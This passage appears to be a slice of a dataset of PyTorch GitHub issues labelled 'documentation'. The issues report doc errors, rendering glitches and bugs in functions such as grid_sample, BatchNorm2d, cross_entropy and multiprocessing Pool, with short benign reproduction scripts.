there also a way to access the parameters of a `torch::jit::script::Module` in order to use it for training? At first I thought \"**optimizable models**\" was referring to this but I am unsure now.\r\n\r\nThis issue is related to the post: https://discuss.pytorch.org/t/can-scriptmodule-be-used-for-training/35932\r\n\n\ncc @suo @yf225"},{"labels":["documentation"],"text":"## üìö Documentation\r\nThe docs for [torch.nn.Module](https://pytorch.org/docs/stable/nn.html#torch.nn.Module) does not list  `_version` nor to the `_load_from_state_dict`. It should be listed to describe how to make a module backward compatible with its former weights.\r\nHere are the docstrings I think should be included:\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/nn/modules/module.py#L50-L60\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/nn/modules/module.py#L649-L681"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThere are 3 parameters documented that all try to solve the same problem: `size_average`, `reduce`, `reduction`.  It's fine to document legacy behavior, but IMO it should be done after the non-legacy behavior has been explained concisely.\r\n\r\nAlso, some of the documentation is just wrong.  For example:\r\n`If reduce is True (default)`\r\n\r\nbut the default of `reduce` is `None`.\r\n\r\nAlso:\r\n` ‚Äòmean‚Äô: the sum of the output will be divided by the number of elements in the output`\r\n\r\nBut as shown in the formula above, it's divided by `weight[targets].sum()`."},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/master/torch.html#torch.broadcast_tensors\r\n![image](https://user-images.githubusercontent.com/5652049/53575547-ca07d480-3b3f-11e9-909d-7eed4e667c07.png)\r\n\r\n`_broadcasting-semantics` should be a link to our broadcasting semantics page, but it is not rendered correctly.\r\n"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nHi. Thanks for the great library. I have a short example below detailing my question. I couldn't find any info about this in the docs or on the pytorch forums.\r\n\r\n```\r\nimport torch\r\nimport numpy as np\r\ntorch.manual_seed(21)\r\n\r\nA = (torch.rand(10, 10, 10) > 0.9)\r\ni, j, k = A.nonzero().t()\r\nijk = torch.stack((i, j, k), dim=1).numpy()\r\ninds = np.lexsort(ijk[:, ::-1].T)\r\nijk_sorted = ijk[inds]\r\n\r\nprint((ijk == ijk_sorted).all())\r\n>> True\r\n```\r\n\r\nI was just wondering if this behavior is guaranteed by the API? I would like to depend on the lexicographic ordering in my application without paying for an additional sort. Numpy's documentation for the corresponding `numpy.nonzero` mentions that \"The values are always tested and returned in row-major, C-style order.\" Maybe a similar blurb could be added to the torch docs? Hope my question makes sense."},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\nSpecifically, the entry https://pytorch.org/docs/stable/tensors.html#torch.Tensor.cpu says that no copy is made if \"this object is already in CPU memory and on the correct device\". For CPU tensors, there should be one device, so the last part doesn't make sense."},{"labels":["documentation"],"text":"## üêõ Bug\r\n\r\nDescription of `torch.distributed.broadcast_multigpu` have broken in-line code, but I can't figure out a way to resolve it.\r\nPossibly a markdown-related issue with Sphinx?\r\n\r\nCode: https://github.com/pytorch/pytorch/blob/master/torch/distributed/distributed_c10d.py#L668-L669\r\n\r\nDoc. link with problem: https://pytorch.org/docs/stable/distributed.html#torch.distributed.broadcast_multigpu\r\n\r\n![image](https://user-images.githubusercontent.com/13394294/52993393-60107080-3457-11e9-917f-ab07f53ac021.png)\r\n\r\n\r\n"},{"labels":["documentation"],"text":"Hello,\r\n\r\nThe explanation of `pos_weight` for [BCEWithLogitsLoss](https://pytorch.org/docs/stable/nn.html#torch.nn.BCEWithLogitsLoss) mentions:\r\n`where :math:`p_n` is the positive weight of class :math:`n`.`\r\n\r\nWe don't have `n` classes (this is a binary loss). The correct description would be something like this:\r\n`:math:p_n is the weight of the positive class for sample n in the batch`\r\n\r\n(I also don't understand the utility of having a different positive-class-weight per sample in a batch, because you usually apply the same class weight for the whole training data. But that's a different issue.)"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\n`torch.lerp` takes in `start` and `end`, but so does `tensor.lerp`? Shouldn't the `tensor` be used as `start` (or `end`)? And the doc should be clear which one it is.\r\n\r\n<img width=\"919\" alt=\"screenshot 2019-02-16 16 51 42\" src=\"https://user-images.githubusercontent.com/5674597/52905660-3a8f2700-320b-11e9-914f-ba4246e07548.png\">\r\n"},{"labels":[null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nThe following program never terminates.\r\n\r\n```\r\nimport torch\r\nimport torch.multiprocessing as mp\r\n\r\n\r\ndef foo():\r\n    x = torch.ones((2, 50, 10))\r\n    return torch.einsum('ijl,ikl->ijk', x, x)\r\n\r\n\r\nif __name__ == '__main__':\r\n    foo()\r\n    p = mp.Process(target=foo)\r\n    p.start()\r\n    p.join()\r\n```\r\n\r\nThe behavior persists if one changes the `einsum` inside `foo` with an equivalent operation (e.g., `bmm(y, y.transpose(1,2))`, or `(y.unsqueeze(2) * y.unsqueeze(1)).sum(3)`.\r\n\r\nIt doesn't reproduce, however, if one doesn't call `foo` inside the main block.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.0.1.post2\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: Arch Linux\r\nGCC version: (GCC) 8.2.1 20181127\r\nCMake version: version 3.13.4\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\n## Additional context\r\n\r\nPerhaps related to #2245."},{"labels":["documentation"],"text":"\r\nMissing  Examples in the docs for samplers like WeightedRandomSampler .\r\n\r\nCame across the problem from here :\r\n\r\nhttps://forums.fast.ai/t/weighted-random-sampler-pytorch/27947 \r\n"},{"labels":["documentation",null,null,null],"text":"## üêõ Bug\r\n\r\nCannot create a `torch.multiprocessing.pool.Pool` instance.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```\r\nPython 3.6.3rc1+ (default, Feb  5 2019, 15:51:57)\r\nType 'copyright', 'credits' or 'license' for more information\r\nIPython 6.5.0 -- An enhanced Interactive Python. Type '?' for help.\r\n\r\nIn [1]: from torch.multiprocessing.pool import Pool\r\n\r\nIn [2]: p = Pool(1)\r\n---------------------------------------------------------------------------\r\nTypeError                                 Traceback (most recent call last)\r\n<ipython-input-5-ce2ba693018c> in <module>()\r\n----> 1 p = Pool(1)\r\n\r\n/usr/local/fbcode/gcc-5-glibc-2.23/lib/python3.6/multiprocessing/pool.py in __init__(self, processes, initializer, initargs, maxtasksperchild, context)\r\n    154                  maxtasksperchild=None, context=None):\r\n    155         self._ctx = context or get_context()\r\n--> 156         self._setup_queues()\r\n    157         self._taskqueue = queue.Queue()\r\n    158         self._cache = {}\r\n\r\n/mnt/xarfuse/uid-169887/8eb75d00-ns-4026531840/torch/multiprocessing/pool.py in _setup_queues(self)\r\n     21\r\n     22     def _setup_queues(self):\r\n---> 23         self._inqueue = SimpleQueue()\r\n     24         self._outqueue = SimpleQueue()\r\n     25         self._quick_put = self._inqueue._writer.send\r\n\r\nTypeError: __init__() missing 1 required keyword-only argument: 'ctx'\r\n```\r\n\r\n## Expected behavior\r\n\r\nNo exception."},{"labels":["documentation"],"text":"e.g. https://github.com/pytorch/pytorch/issues/16894\r\n\r\nThere's a lot of people asking about this, but no canonical source of information about it."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe explanation of `pos_weight` for [BCEWithLogitsLoss](https://pytorch.org/docs/stable/nn.html#torch.nn.BCEWithLogitsLoss) mentions:\r\n`where :math:`p_n` is the positive weight of class :math:`n`.`\r\n\r\nWe don't have `n` classes (this is a binary loss). The correct description would be something like this:\r\n `:math:p_n is the weight of the positive class for sample n in the batch`\r\n\r\n(I also don't understand the utility of having a different positive-class-weight per sample in a batch, because you usually apply the same class weight for the whole training data. But that's a different issue.)"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nSee attached image. \"Tuple of ints\" is rendered as \"Tuple of python:ints\" instead of \"int\" being converted into a cross-reference.\r\n\r\n\r\n<img width=\"536\" alt=\"image\" src=\"https://user-images.githubusercontent.com/1893159/51939676-10053780-23de-11e9-80e2-7fa091ea4396.png\">\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation"],"text":"https://pytorch.org/docs/master/nn.html#one-hot"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\nis it `bool` instead of `float`?\r\n\r\nhttps://pytorch.org/docs/stable/nn.html?highlight=tripletmarginloss#torch.nn.TripletMarginLoss\r\n\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\n`CLASSMETHOD` overlays the method name `from_pretrained`, making it difficult to interpret. See https://pytorch.org/docs/stable/nn.html#torch.nn.Embedding.from_pretrained.\r\n\r\n![screen shot 2019-01-27 at 20 58 57](https://user-images.githubusercontent.com/36465988/51803047-6ce5de00-2276-11e9-8e0d-bba4174783f9.png)"},{"labels":["documentation"],"text":"Wikipedia: https://en.wikipedia.org/wiki/Jacobian_matrix_and_determinant\r\n\r\n<img width=\"860\" alt=\"screenshot 2019-01-24 19 24 14\" src=\"https://user-images.githubusercontent.com/5317244/51717139-a9fb6780-200d-11e9-95b6-589ba859b221.png\">\r\n\r\nPyTorch docs: https://pytorch.org/tutorials/beginner/blitz/autograd_tutorial.html\r\n\r\n![image](https://user-images.githubusercontent.com/5317244/51717148-b4b5fc80-200d-11e9-90d4-74f663d5a59d.png)\r\n\r\nWhy deviate from the convention? \r\n\r\nHad to stare at it for a bit to realize the definition of the Jacobian is the transpose in PyTorch. "},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n![screenshot_2019-01-24 probability distributions - torch distributions pytorch master documentation](https://user-images.githubusercontent.com/5520155/51647989-eadf7780-1f4c-11e9-8a6a-a3310705513e.png)\r\n\r\nThe [documentation for Categorical distributions](https://pytorch.org/docs/stable/distributions.html) states that it can take logits, which it calls \"event log **probabilities**\". I think this should either be log odds. This is minor but the terminology with logits is confusing enough already."},{"labels":["documentation",null],"text":"## üöÄ Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\n\r\nAfter https://github.com/pytorch/pytorch/pull/15414, torhch.norm supports dtype, but not with 'fro' or 'nuc' arguments.  This is confusing and not documented.\r\n\r\n## Motivation\r\n\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\n\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\n\r\n## Alternatives\r\n\r\n<!-- A clear and concise description of any alternative solutions or features you've considered, if any. -->\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context or screenshots about the feature request here. -->\r\n"},{"labels":[null,"documentation",null],"text":"we writing a Mixed C++/CUDA extension(https://pytorch.org/tutorials/advanced/cpp_extension.html)\r\nsuccess compile and running test in pytorch=0.4.1 and python= 3.6\r\nhowever suffer bug in pytorch=1.0 and python= 3.6 \r\n`anaconda3/envs/python3.6_pytorch1.0/lib/python3.6/site-packages/torch/lib/include/torch/csrc/jit/argument_spec.h(59): error: static assertion failed with \"ArgumentInfo is to be a POD struct`\r\n\r\nin order to success compile ÔºåWe have to uncomment/disable line 59-60 in torch/lib/include/torch/csrc/jit/argument_spec.h \r\n`static_assert(std::is_pod<ArgumentInfo>::value,\r\n  \"ArgumentInfo is to be a POD struct\");`\r\n\r\nSO We wonder is check pod necessary Ôºü What is the significance of doing this?\r\n\r\nTHX"},{"labels":["documentation",null],"text":"Documentation for ### scatter_ method lists the following arguments: **scatter_(dim, index, src)** \r\nIt also, incorrectly, states that **src** can be a tensor or a float.\r\nBut it looks like, that in release 1.0.0, **src** cannot be a single float number. When you want to write the single float value to the tensor, you need to use undocumented **value** parameter, not **src** parameter. E.g. my_tensor.scatter_(dim=1, index=index_tensor, value=0.0)\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThere seems to be a lot of confusion around Mutilabel losses. \r\n- https://discuss.pytorch.org/t/multi-label-classification-in-pytorch/905\r\n- https://discuss.pytorch.org/t/help-about-multi-classification/14418 \r\n- https://discuss.pytorch.org/t/why-multilabelmarginloss-take-torch-long-has-arguments/28970\r\n- https://discuss.pytorch.org/t/multilabelmarginloss-input-formation/9155/2\r\n\r\nOne area in particular is it looks like there needs to be more clarity on what the target format of MultiLabelMarginLoss and MultiLabelSoftMarginLoss. One top-search-result example https://gist.github.com/bartolsthoorn/36c813a4becec1b260392f5353c8b7cc has over 1500 link follows on the forums but actually implements it incorrectly (uses a onehot instead of class indices with negative number padding).\r\n\r\nIt might be useful to explicitly point out in https://github.com/pytorch/pytorch/blob/cb3241866917024a59955a5099a8eab461357d9c/torch/nn/modules/loss.py#L941 that it is not a onehot target, and perhaps provide an example in the docs.\r\n"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\nWhen a documentation page loads, I need to wait a few seconds before being able to CTR+F (find in page) what I want. While it loads, things jump around. I preferred the old documentation website, I don't like the upgrade, although the upgrade looks way nicer, it was previously more functional. "},{"labels":[null,"documentation"],"text":"Mentioning the implementation of CReLU in the docs near ReLU in the way mentioned in #1327"},{"labels":[null,"documentation"],"text":"## üêõ Bug\r\n\r\nIn libtorch, my program crashes when trying to move a tensor to CUDA.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\nI can't share the whole code but here is some context. This is the constructor of CustomOp, where the error happens: \r\n\r\nCustomOp()\r\n: filter(torch::zeros({1, 1, 4, 4}))\r\n{\r\n\t.................\r\n\t\r\n\tauto accessor = filter.accessor<float,4>();\r\n\tfor (int x = 0; x < 4; ++x) {\r\n\t\tfor (int y = 0; y < 4; ++y) {\r\n\t\t\taccessor[0][0][x][y] = ............;\r\n\t\t}\r\n\t}\r\n\t\r\n\tfilter = filter.to(at::kCUDA);\r\n}\r\n\r\nThe program crashes on the line \"filter = filter.to(at::kCUDA);\".\r\n\r\nThis CustomOp instance is created as a member of the Network class, which has no superclass (just like CustomOp), with its default (and only) constructor, at the very beginning of main():\r\n\r\n#include \"network.h\"\r\n\r\nint main() {\r\n    Network network;\r\n    ......................\r\n\r\nError message:\r\n\r\nterminate called after throwing an instance of 'c10::Error'\r\n  what():  p ASSERT FAILED at /pytorch/c10/impl/DeviceGuardImplInterface.h:130, please report a bug to PyTorch. DeviceGuardImpl for cuda is not available (getDeviceGuardImpl at /pytorch/c10/impl/DeviceGuardImplInterface.h:130)\r\nframe #0: std::function<std::string ()>::operator()() const + 0x11 (0x7fd1101802e1 in ~/libtorch/lib/libc10.so)\r\nframe #1: c10::Error::Error(c10::SourceLocation, std::string const&) + 0x2a (0x7fd11017fc1a in ~/libtorch/lib/libc10.so)\r\nframe #2: at::native::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) + 0x1604 (0x7fd110b4d704 in ~/libtorch/lib/libcaffe2.so)\r\nframe #3: at::TypeDefault::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) const + 0x17 (0x7fd110cf7f57 in ~/libtorch/lib/libcaffe2.so)\r\nframe #4: torch::autograd::VariableType::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) const + 0x17a (0x7fd11980a16a in ~/libtorch/lib/libtorch.so.1)\r\nframe #5: at::Tensor::to(c10::TensorOptions const&, bool, bool) const + 0x68 (0x439c36 in ./aten_app)\r\nframe #6: custom_ops::CustomOp::CustomOp() + 0x214 (0x43b3fc in ./aten_app)\r\nframe #7: Network::Network() + 0x44 (0x424498 in ./aten_app)\r\nframe #8: main + 0x2b (0x441ec2 in ./aten_app)\r\nframe #9: __libc_start_main + 0xf0 (0x7fd10f81e830 in /lib/x86_64-linux-gnu/libc.so.6)\r\nframe #10: _start + 0x29 (0x41e4f9 in ./aten_app)\r\n\r\nAborted (core dumped)\r\n\r\n## Expected behavior\r\n\r\nThe app does not crash.\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.0.0a0+5e62494\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.2.88\r\n\r\nOS: Ubuntu 16.04.3 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609\r\nCMake version: version 3.12.0-rc2\r\n\r\nPython version: 3.5\r\nIs CUDA available: Yes\r\nCUDA runtime version: 9.2.88\r\nGPU models and configuration: \r\nGPU 0: TITAN X (Pascal)\r\nGPU 1: TITAN X (Pascal)\r\n\r\nNvidia driver version: 396.26\r\ncuDNN version: Probably one of the following:\r\n/usr/lib/x86_64-linux-gnu/libcudnn.so.6.0.21\r\n/usr/local/cuda-9.2/targets/x86_64-linux/lib/libcudnn.so.7.2.1\r\n/usr/local/cuda-9.2/targets/x86_64-linux/lib/libcudnn_static.a\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy (1.13.3)\r\n[pip3] torch (1.0.0a0+5e62494)\r\n[pip3] torchfile (0.1.0)\r\n[pip3] torchvision (0.1.9)\r\n[conda] Could not collect\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation"],"text":"## üìö Documentation\r\nDocument display errorÔºåEg Ôºö https://pytorch.org/cppdocs/api/classat_1_1_tensor.html?highlight=mm#_CPPv3NK2at6Tensor5addmmERK6TensorRK6Tensor6Scalar6Scalar \r\n\r\n![image](https://user-images.githubusercontent.com/15956648/50578045-f1f3f800-0e6e-11e9-914c-7b2cf05d04fd.png)\r\n"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\n@soumyarooproy writes:\r\n\r\n-----------------------------------------------------\r\n\r\nI wrote this tutorial ‚Äî https://github.com/soumyarooproy/scratchpad/blob/master/PyTorchNewTensorType.md ‚Äî for steps to add a new scalar/tensor type. I used `bfloat16` as an example. Could one of you please take a look at it? The write-up is obviously based on my current understanding of PyTorch internals. I would very much appreciate some feedback on it.\r\n\r\nAccompanying references:\r\n- pytorch changes: https://github.com/soumyarooproy/pytorch/pull/1\r\n- c++ extension repo:\r\nhttps://github.com/soumyarooproy/bfloat16_pytorch_cpp_extn\r\n\r\n----------------------------------------------------\r\n\r\nBecause it's the holidays, I'm just opening an issue to track and give feedback so that it doesn't get lost in the noise.\r\n\r\ncc: @li-roy @gchanan @goldsborough @ezyang \r\n\r\n@soumyarooprooy things will likely change fast, see PRs by @li-roy for context such as https://github.com/pytorch/pytorch/pull/15153"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\ndocumentation lists:\r\n\r\n> dim (int or tuple of python:ints) ‚Äì the dimension or dimensions to reduce\r\n\r\nbut underlying function is declared as:\r\n`Tensor logsumexp(const Tensor & self, int64_t dim, bool keepdim)`\r\n\r\nand calling with multiple dimensions fails:\r\n`torch.logsumexp(torch.tensor([[1.],[2.]]),(0,1))`\r\n`TypeError: logsumexp(): argument 'dim' (position 2) must be int, not tuple\r\n`"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nunderlying aten routine in c++ indicates a single tensor is returned:\r\n\r\n`Tensor ormqr(const Tensor & self, const Tensor & input2, const Tensor & input3, bool left=true, bool transpose=false);\r\n`"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nThe function `F.grid_sample` takes two args: `inputs`and `coords`. For the sake of simplicity I'm going to describe this issue for the case when `inputs` represents a grayscale image and has a shape `[1, 1, IH, IW]`. \r\n\r\nThe `coords` argument has shape `[1, OH, OW, 2]`, where the final dimension of size 2 is an x and y coordinate in normalized input space, where `-1,-1` is the top left of the image and `+1,+1` is the bottom right. \r\n\r\nThe `[1, C, OH, OW]` output is constructed by sampling values from the input at the xy-coordinate specified in the `coords` argument. Bilinear interpolation is used when the xy-coordinate (after de-normalization) doesn't fall cleanly within a single pixel in `inputs`.\r\n\r\nThe bug has to do with the behavior when a value in `coords` falls outside of the range `[-1,1]`. The docs state that the value should be bilinearly based on the border mode (the default behaves as if the entire input image was surrounded with zeros). This works in most cases. However, this fails in the case where `IH=1`.\r\n\r\n\r\n## To Reproduce\r\n\r\nFirst consider the working case. Lets just make a 2x2 image and sample \"under it\" at the normalized position `(0, 30)` (which is very far under the sample image).\r\n\r\n```\r\n        # Make a 2x2 image\r\n        inputs = torch.Tensor([\r\n            [1, 2],\r\n            [1, 2]\r\n        ])[None, None]\r\n\r\n        # Sample at a position way outside of the image\r\n        coords = torch.Tensor([0, 30])[None, None, None]\r\n        print(F.grid_sample(inputs, coords))\r\n```\r\n\r\nThis code correctly returns that the sampled value is `tensor([[[[0.]]]])` (because, again, we are way off the image). \r\n\r\nHowever, if we remove a row from the image (making it have shape (1, 2)) and we sample way underneath the image again, we get a non-zero result.\r\n\r\n```\r\n        inputs = torch.Tensor([\r\n            [1, 2],\r\n        ])[None, None]\r\n        coords = torch.Tensor([0, 30])[None, None, None]\r\n        print(F.grid_sample(inputs, coords))\r\n```\r\n\r\nThis outputs `tensor([[[[1.5000]]]])`, which seems to indicate that torch is treating the image as if it is infinitely tiled in the Y direction. \r\n\r\n## Environment\r\n\r\nPyTorch version: 1.0.0 (also tested on 0.4.1)\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: Ubuntu 16.04.5 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609\r\nCMake version: version 3.13.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 8.0.61\r\nGPU models and configuration: GPU 0: GeForce GTX 1050\r\nNvidia driver version: 384.130\r\ncuDNN version: Probably one of the following:\r\n/usr/lib/x86_64-linux-gnu/libcudnn.so.6.0.21\r\n/usr/lib/x86_64-linux-gnu/libcudnn_static_v6.a\r\n\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nIn BatchNorm2d' doc, the explanation of momentum is:\r\n`\\hat{x}_\\text{new} = (1 - \\text{momentum}) \\times \\hat{x} + \\text{momemtum} \\times x_t$`\r\n\r\nwhere `x_t` is the newly computed batch statistics, `\\hat{x}` is the estimated statistics in history.\r\nWhile in my experiments, when momentum set to 0, the batchnorm operates just use the newly computed statistics.\r\n\r\nSo I guess maybe the following explanation is correct:\r\n\r\n`\\hat{x}_\\text{new} = \\text{momemtum\\times \\hat{x} + (1 - \\text{momentum}) \\times x_t$`\r\n\r\n## To Reproduce\r\n\r\n`b_x` is a torch.Tensor with shape (8, 3, 299, 299), which read from an image\r\n`mol` is the model load from `Inception V3`\r\nI have set the momentum as 0 in [Inception v3 model struct](https://github.com/pytorch/vision/blob/master/torchvision/models/inception.py):\r\n\r\n```python\r\nclass BasicConv2d(nn.Module):\r\n\r\n    def __init__(self, in_channels, out_channels, **kwargs):\r\n        super(BasicConv2d, self).__init__()\r\n        self.conv = nn.Conv2d(in_channels, out_channels, bias=False, **kwargs)\r\n        self.bn = nn.BatchNorm2d(out_channels, eps=0.001, momentum=0)\r\n\r\n    def forward(self, x):\r\n        x = self.conv(x)\r\n        x = self.bn(x)\r\n        return F.relu(x, inplace=True)\r\n```\r\n\r\nThen I calculate the mean and var:\r\n``` python\r\nconv = mol.Conv2d_1a_3x3.conv(b_x)\r\ndim = conv.shape\r\nm = (conv.sum(0).sum(1).sum(1)/(dim[0]*dim[2]*dim[3])).view(1, -1, 1, 1)\r\nvar = (((conv-m)**2).sum(0).sum(1).sum(1)/(dim[0]*dim[2]*dim[3]-1)).view(1, -1, 1, 1) + 0.001\r\ntmp = (conv - m) / torch.sqrt(var)\r\ntmp = tmp * mol.Conv2d_1a_3x3.bn.weight.view(1, -1, 1, 1) + mol.Conv2d_1a_3x3.bn.bias.view(1, -1, 1, 1)\r\nbn = mol.Conv2d_1a_3x3.bn(conv)\r\nprint((bn-tmp).mean(), (bn-tmp).std())\r\n```\r\n\r\nThe result is that `bn=tmp` while `momentum = 0`\r\n\r\n## Expected behavior\r\n\r\nExpected `bn=tmp` while `momentum = 1`\r\n\r\n## Environment\r\n\r\n - PyTorch Version 0.4.1:\r\n - Windows:\r\n - pip:\r\n - Python version: 3.6.5\r\n"},{"labels":[null,"documentation"],"text":"The cross entropy loss requires a linear output layer with no softmax activation function.\r\nHowever, the documentation isn't specifying this in a clear way IMHO.\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/nn/modules/loss.py#L824\r\nShould it be rephrased to something like:\r\n    ```The `input` is expected to contain scores for each class. Don't normalize these scores into probabilities.```"},{"labels":["documentation",null],"text":"pytorch 1.0\r\n-------------\r\nDOC:This is used for measuring the error of a reconstruction in for example an auto-encoder. Note that the targets y should be numbers between 0 and 1.\r\n--------------\r\nimport torch \r\nimport torch.nn.functional as F\r\nb=[[0.2,0.1]]\r\nc=[[1.,3.]]\r\naa = torch.tensor(b,requires_grad=True)\r\ntarget = torch.tensor(c)\r\noutput = F.binary_cross_entropy(aa,target,reduce=True,size_average=True)\r\nz=output.sum()\r\nz.backward()\r\nprint(output)\r\n-----------------------\r\ntensor(4.1532, grad_fn=<BinaryCrossEntropyBackward>)\r\n---------------\r\ntarget value is 1 and 3.,not between 0 and 1.\r\n"},{"labels":["documentation",null],"text":"pytorch 1.0\r\nDOC err:torch.nn.CrossEntropyLoss\r\nif weight=NONE\r\nloss(x,class)=‚àíx[class]+log(j‚àë‚Äãexp(x[j])) ,The result is correct.\r\n\r\nif weight!=NONE\r\nloss(x,class)=weight[class]*(‚àíx[class]+log(j‚àë‚Äãexp(x[j]))) ,The result is wrong?\r\n-----------------------\r\nimport torch\r\nimport torch.nn.functional as F\r\na=[[-5.,-6.],[3.,2.],[3.,2.]]\r\nc=[1,0,1]\r\nb=[3.,2.]\r\ninput=torch.tensor(a,requires_grad=True)\r\ntarget = torch.tensor(c)\r\nweight = torch.tensor(b)\r\noutput = F.cross_entropy(input,target,weight,reduce=True,size_average=True)\r\nz=output.sum()\r\nz.backward()\r\nprint(output,input.grad)\r\n------------------------------\r\ntensor(0.8847, grad_fn=) tensor([[ 0.2089, -0.2089],\r\n[-0.1153, 0.1153],\r\n[ 0.2089, -0.2089]])\r\n------------------\r\n\r\n"},{"labels":["documentation",null],"text":"How does this function calculate grad:torch.nn.functional.cross_entropy \r\nfor example :out= input[i][target[i]], i=0to N-1,dout/dinput=?\r\nCan you attach the derivative formula to the document?"},{"labels":["documentation"],"text":"The tutorial at: https://pytorch.org/tutorials/beginner/blitz/autograd_tutorial.html#gradients\r\n![image](https://user-images.githubusercontent.com/1032377/49982017-a95cb500-ff28-11e8-9465-7b0da9ce39c4.png)\r\n"},{"labels":["documentation"],"text":"there's still a page on it: https://pytorch.org/docs/master/ffi.html?highlight=ffi"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\ntorch.legacy can still be found in docs, and also on the README page.\r\n"},{"labels":["documentation"],"text":"https://pytorch.org/docs/master/distributions.html#relaxedonehotcategorical\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/49818771-96d45700-fd41-11e8-97cd-8d87f4a5fd8d.png)\r\n"},{"labels":["documentation",null],"text":"They should have a test case, test plan, etc..."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nWith the new 1.0 documentation up, the formulas in note for torch.optim.SGD isn't being rendered:\r\n![image](https://user-images.githubusercontent.com/3891274/49739907-b022c800-fc9b-11e8-9863-dc42c8e11506.png)\r\n\r\nFormulas in other places, e.g., torch.nn, appear fine."},{"labels":[null,"documentation"],"text":"## üêõ Bug\r\n\r\nThe CONTRIBUTING.md file documents a command (`python setup.py rebuild_libtorch`) for re-building only the PyTorch C++ code, but it does not exist.\r\n\r\nThe command is documented here: https://github.com/pytorch/pytorch/blob/master/CONTRIBUTING.md#build-only-what-you-need\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Build PyTorch from source in development mode using `python setup.py build develop`.\r\n1. Run `python setup.py rebuild_libtorch`\r\n\r\n```\r\n$ python setup.py rebuild_libtorch\r\nBuilding wheel torch-1.0.0a0\r\nusage: setup.py [global_opts] cmd1 [cmd1_opts] [cmd2 [cmd2_opts] ...]\r\n   or: setup.py --help [cmd1 cmd2 ...]\r\n   or: setup.py --help-commands\r\n   or: setup.py cmd --help\r\n\r\nerror: invalid command 'rebuild_libtorch'\r\n```\r\n\r\n## Expected behavior\r\n\r\nThe command should exist, or the documentation in CONTRIBUTING.md should be updated.\r\n\r\nI'm using this command as a workaround:\r\n\r\n```\r\n$ ninja -C build libtorch_python.so\r\n```\r\n\r\n## Environment\r\n\r\n(I'm building this inside of a Docker container.)\r\n\r\nPyTorch version: 